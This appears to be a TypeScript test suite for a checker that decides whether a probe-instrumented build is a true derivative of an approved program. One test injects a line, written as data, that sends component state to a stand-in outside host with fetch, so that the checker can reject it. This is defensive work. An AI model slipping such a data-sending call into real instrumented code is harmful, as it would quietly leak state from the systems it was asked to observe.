import test from 'ava'
import { admissibleVariant, probePlanHash, sealVariantManifest, verifyVariantManifest, type RpcApprovedRevision, type RpcDerivativeEvidence } from '@source-repo/diagnostics/variant'
import { provesDerivative, stripProbes, PROBE_RECEIVER } from './variant.js'

/**
 * Proving a derivative is one, which is not generating one.
 *
 * Almost every test here is a refusal, and that is the shape of the thing: a check that only ever
 * says yes to the file the generator happened to produce has checked nothing. The positive case is
 * one test; the rest are the ways a build can differ from the source it claims to instrument.
 */

const REVISION = 'rev-7'
const FILE = 'oven.ts'

const base = `import { rpc, RpcComponent } from '@source-repo/rpc'

export class Oven extends RpcComponent<Props, State> {
    @rpc({ semantics: 'idempotent-command' })
    async heat(target: number) {
        const clamped = target > 300 ? 300 : target
        if (clamped < this.state.ambient) {
            return this.state.setpoint
        }
        this.setState({ setpoint: clamped })
        return clamped
    }
}
`

/** The same program with probes generated into it, written by hand because nothing generates yet. */
const instrumented = `import { rpc, RpcComponent } from '@source-repo/rpc'
import { ${PROBE_RECEIVER} } from '@source-repo/rpc-diagnostics-runtime'

export class Oven extends RpcComponent<Props, State> {
    @rpc({ semantics: 'idempotent-command' })
    async heat(target: number) {
        ${PROBE_RECEIVER}.entry('p1');
        const clamped = ${PROBE_RECEIVER}.value('p2', target > 300 ? 300 : target)
        if (${PROBE_RECEIVER}.condition('p3', clamped < this.state.ambient)) {
            ${PROBE_RECEIVER}.branch('p4');
            return this.state.setpoint
        }
        ${PROBE_RECEIVER}.statement('p5');
        this.setState({ setpoint: clamped })
        ${PROBE_RECEIVER}.exit('p6');
        return clamped
    }
}
`

test('stripping the probes out of a variant reproduces the approved program', async (t) => {
    const proof = await provesDerivative(base, instrumented, FILE, REVISION)

    t.true(proof.equivalent, proof.refusal?.why ?? 'the stripped variant should be the base program')
    t.is(proof.baseSemanticDigest, proof.strippedSemanticDigest)
    t.deepEqual(
        proof.probes.map((probe) => `${probe.probeId}:${probe.kind}`),
        ['p1:function-entry', 'p2:value', 'p3:condition', 'p4:branch', 'p5:statement', 'p6:function-exit'],
        'and every probe is accounted for, by id and kind'
    )
})

test('a wrapped expression is carried out whole, so it is still evaluated exactly once', (t) => {
    const outcome = stripProbes(instrumented, FILE, REVISION)
    t.false('refusal' in outcome)
    if ('refusal' in outcome) return
    t.true(outcome.stripped.includes('const clamped = target > 300 ? 300 : target'))
    t.false(outcome.stripped.includes(PROBE_RECEIVER), 'and nothing of the instrumentation is left behind, its import included')
})

test('a variant that changed the program is refused, and the digests say so rather than the probes', async (t) => {
    // 300 became 350. One literal, in an expression a probe wraps - the case a check that only
    // looked at probe shapes would pass, because every probe here is perfectly well formed.
    const proof = await provesDerivative(base, instrumented.replace('target > 300 ? 300 : target', 'target > 350 ? 350 : target'), FILE, REVISION)

    t.false(proof.equivalent)
    t.is(proof.refusal, undefined, 'nothing refused to strip: the strip worked and the answer is that the program is different')
    t.not(proof.baseSemanticDigest, proof.strippedSemanticDigest)
})

test('a statement smuggled in beside a probe is a changed program too', async (t) => {
    const proof = await provesDerivative(base, instrumented.replace(`${PROBE_RECEIVER}.statement('p5');`, `${PROBE_RECEIVER}.statement('p5'); void fetch('http://elsewhere/' + this.state.setpoint);`), FILE, REVISION)
    t.false(proof.equivalent)
})

test('comments and formatting are not the program, and a variant is not refused for them', async (t) => {
    const commented = instrumented.replace(`${PROBE_RECEIVER}.entry('p1');`, `// probe p1: entry\n        ${PROBE_RECEIVER}.entry('p1');`).replace('async heat(target: number) {', 'async heat(target: number)\n    {')
    const proof = await provesDerivative(base, commented, FILE, REVISION)
    t.true(proof.equivalent, proof.refusal?.why ?? 'reformatting is not a change to the program')
})

test('an unrecognised probe form refuses rather than being stripped on a guess', (t) => {
    const outcome = stripProbes(instrumented.replace(`${PROBE_RECEIVER}.statement('p5');`, `${PROBE_RECEIVER}.snapshot('p5');`), FILE, REVISION)
    t.true('refusal' in outcome)
    if (!('refusal' in outcome)) return
    t.regex(outcome.refusal.why, /not a probe form this version recognises/)
})

test('a probe whose id is computed cannot be matched against an approved plan, so it refuses', (t) => {
    const outcome = stripProbes(instrumented.replace(`${PROBE_RECEIVER}.value('p2',`, `${PROBE_RECEIVER}.value(idFor(target),`), FILE, REVISION)
    t.true('refusal' in outcome)
    if (!('refusal' in outcome)) return
    t.regex(outcome.refusal.why, /literal id/)
})

test('the receiver referred to rather than called refuses: the reference could reach anywhere', (t) => {
    const outcome = stripProbes(instrumented.replace(`${PROBE_RECEIVER}.statement('p5');`, `const send = ${PROBE_RECEIVER}.statement;`), FILE, REVISION)
    t.true('refusal' in outcome)
    if (!('refusal' in outcome)) return
    t.regex(outcome.refusal.why, /referred to rather than called/)
})

test('a probe used as a value is part of the program, so removing it would change one', (t) => {
    const outcome = stripProbes(instrumented.replace(`${PROBE_RECEIVER}.statement('p5');`, `const marked = ${PROBE_RECEIVER}.statement('p5') ?? 1;`), FILE, REVISION)
    t.true('refusal' in outcome)
    if (!('refusal' in outcome)) return
    t.regex(outcome.refusal.why, /used as a value rather than standing alone/)
})

test('a refused strip leaves no digest to compare, and says so instead of comparing one', async (t) => {
    const proof = await provesDerivative(base, instrumented.replace(`${PROBE_RECEIVER}.statement('p5');`, `${PROBE_RECEIVER};`), FILE, REVISION)
    t.false(proof.equivalent)
    t.truthy(proof.refusal)
    t.is(proof.strippedSemanticDigest, '')
})

const approved: RpcApprovedRevision = {
    componentId: 'oven3',
    semanticRevisionId: REVISION,
    sourceBundleHash: 'sha256-bundle',
    artifactHash: 'sha256-base-artifact',
    contractHash: 'sha256-contract',
    persistentStateSchemaHash: 'sha256-state',
    nonDiagnosticCapabilityHash: 'sha256-capabilities'
}

const manifestFor = async (probes: RpcDerivativeEvidence['plan'], overrides: Record<string, unknown> = {}) =>
    sealVariantManifest({
        componentId: approved.componentId,
        semanticRevisionId: approved.semanticRevisionId,
        sourceBundleHash: approved.sourceBundleHash,
        baseArtifactHash: approved.artifactHash,
        artifactVariantId: 'oven3-diag-1',
        artifactVariantHash: 'sha256-variant-artifact',
        probePlanId: 'plan-1',
        probePlanHash: await probePlanHash(probes),
        contractHash: approved.contractHash,
        persistentStateSchemaHash: approved.persistentStateSchemaHash,
        nonDiagnosticCapabilityHash: approved.nonDiagnosticCapabilityHash,
        diagnosticsAdapter: { language: 'typescript', adapterVersion: '0.1.0' },
        ...overrides
    })

const evidenceFor = async (probes: RpcDerivativeEvidence['plan'], overrides: Partial<RpcDerivativeEvidence> = {}): Promise<RpcDerivativeEvidence> => ({
    baseSemanticDigest: 'sha256-semantic',
    strippedSemanticDigest: 'sha256-semantic',
    plan: probes,
    found: probes.map((probe) => ({ probeId: probe.probeId, kind: probe.kind })),
    addedCapabilities: [],
    ...overrides
})

const probesOf = async () => {
    const outcome = stripProbes(instrumented, FILE, REVISION)
    if ('refusal' in outcome) throw new Error(outcome.refusal.why)
    return outcome.probes
}

test('an admissible variant is the base plus probes, and nothing else moved', async (t) => {
    const probes = await probesOf()
    t.is(await admissibleVariant(await manifestFor(probes), approved, await evidenceFor(probes)), undefined)
})

test('a variant built from source that has since moved on is refused', async (t) => {
    const probes = await probesOf()
    const refusal = await admissibleVariant(await manifestFor(probes), { ...approved, semanticRevisionId: 'rev-8' }, await evidenceFor(probes))
    t.regex(refusal ?? '', /probes generated against source that has since moved/)
})

test('a stripped variant that is not the base is the refusal this whole pass exists for', async (t) => {
    const probes = await probesOf()
    const refusal = await admissibleVariant(await manifestFor(probes), approved, await evidenceFor(probes, { strippedSemanticDigest: 'sha256-something-else' }))
    t.regex(refusal ?? '', /the transformation changed the program/)
})

test('a changed contract, state schema or capability set each refuse in their own words', async (t) => {
    const probes = await probesOf()
    const contract = await admissibleVariant(await manifestFor(probes, { contractHash: 'sha256-other' }), approved, await evidenceFor(probes))
    const state = await admissibleVariant(await manifestFor(probes, { persistentStateSchemaHash: 'sha256-other' }), approved, await evidenceFor(probes))
    const capabilities = await admissibleVariant(await manifestFor(probes, { nonDiagnosticCapabilityHash: 'sha256-other' }), approved, await evidenceFor(probes))

    t.regex(contract ?? '', /same contract/)
    t.regex(state ?? '', /restored into a shape that cannot hold it/)
    t.regex(capabilities ?? '', /changed what it is allowed to do/)
})

test('the diagnostics sink is the only capability a variant may add', async (t) => {
    const probes = await probesOf()
    t.is(await admissibleVariant(await manifestFor(probes), approved, await evidenceFor(probes, { addedCapabilities: ['diagnostics.telemetry'] })), undefined)
    const refusal = await admissibleVariant(await manifestFor(probes), approved, await evidenceFor(probes, { addedCapabilities: ['diagnostics.telemetry', 'plant.write'] }))
    t.regex(refusal ?? '', /using instrumentation as a way to widen its own authority/)
})

test('the plan a reviewer approved has to be the plan being served', async (t) => {
    const probes = await probesOf()
    const refusal = await admissibleVariant(await manifestFor(probes.slice(0, 3)), approved, await evidenceFor(probes))
    t.regex(refusal ?? '', /is not the plan being served/)
})

test('a probe in the artifact that the plan does not name is an observation point nobody reviewed', async (t) => {
    const probes = await probesOf()
    const refusal = await admissibleVariant(await manifestFor(probes.slice(0, 5)), approved, await evidenceFor(probes.slice(0, 5), { found: probes.map((probe) => ({ probeId: probe.probeId, kind: probe.kind })) }))
    t.regex(refusal ?? '', /an observation point nobody reviewed/)
})

test('a plan naming a probe the artifact lacks is an overlay that can never fire', async (t) => {
    const probes = await probesOf()
    const refusal = await admissibleVariant(await manifestFor(probes), approved, await evidenceFor(probes, { found: probes.slice(0, 4).map((probe) => ({ probeId: probe.probeId, kind: probe.kind })) }))
    t.regex(refusal ?? '', /can never fire/)
})

test('a plan is a set of observations, so the order it was walked in cannot change its hash', async (t) => {
    const probes = await probesOf()
    t.is(await probePlanHash(probes), await probePlanHash([...probes].reverse()))
})

test('a manifest edited after sealing no longer verifies, which is what makes the plan immutable', async (t) => {
    const probes = await probesOf()
    const sealed = await manifestFor(probes)
    t.is(await verifyVariantManifest(sealed), undefined)
    const edited = { ...sealed, probePlanHash: 'sha256-swapped' }
    t.regex((await verifyVariantManifest(edited)) ?? '', /something changed after it was sealed/)
    t.regex((await admissibleVariant(edited, approved, await evidenceFor(probes))) ?? '', /something changed after it was sealed/)
})

test('a variant that hashes to its own base carries no probes, and is refused where it is written', async (t) => {
    const probes = await probesOf()
    await t.throwsAsync(manifestFor(probes, { artifactVariantHash: approved.artifactHash }), { message: /silently did nothing/ })
})

test('a manifest that cannot name its adapter is refused where it is written', async (t) => {
    const probes = await probesOf()
    await t.throwsAsync(manifestFor(probes, { diagnosticsAdapter: { language: 'typescript', adapterVersion: '' } }), { message: /which transformer produced a derivative/ })
})
